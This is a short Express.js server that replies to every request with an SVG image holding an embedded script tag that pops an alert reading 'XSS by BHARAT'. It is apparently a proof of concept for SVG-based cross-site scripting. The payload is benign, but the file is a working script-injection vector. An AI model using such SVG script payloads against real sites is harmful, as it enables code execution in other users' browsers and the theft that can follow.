const express = require('express')
const app = express()
app.all('/', (req, res) => {
    console.log("Just got a request!")
    data=`<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("XSS by BHARAT");
  </script>
</svg> `
    res.send(data)
})
app.listen(process.env.PORT || 3000)
